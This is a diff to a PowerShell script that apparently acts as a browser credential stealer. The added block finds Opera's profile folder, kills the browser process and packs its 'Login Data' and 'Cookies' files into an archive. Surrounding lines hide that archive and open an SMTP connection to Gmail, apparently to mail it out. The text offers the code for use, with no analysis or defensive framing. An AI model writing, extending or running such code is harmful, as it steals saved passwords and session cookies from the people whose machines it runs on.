@@ -58,6 +58,17 @@ if(Test-Path -Path $o){
 }
 else{echo "Oasd";$e=$e+'Oasd'}
 
+$og=($env:APPDATA+"\Opera Software\Opera Stable\");
+if(Test-Path -Path $og){
+  Stop-Process -Name browser -ErrorAction SilentlyContinue;
+  if("WinRAR" -in $arh)
+    {Get-ChildItem -Path $og -Include ("Login Data"), ("Cookies") -Recurse | Compress-Archive -CompressionLevel Fastest -DestinationPath $p}
+  elseif("7-Zip"-in $arh)
+    {.\7z.exe a $p ($og+"Login Data") -spf -tzip | .\7z.exe a $p ($og+"Cookies") -spf -tzip}
+  echo "OGqwe"
+}
+else{echo "OGasd";$e=$e+'OGasd'}
+
 attrib +H $p
 
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
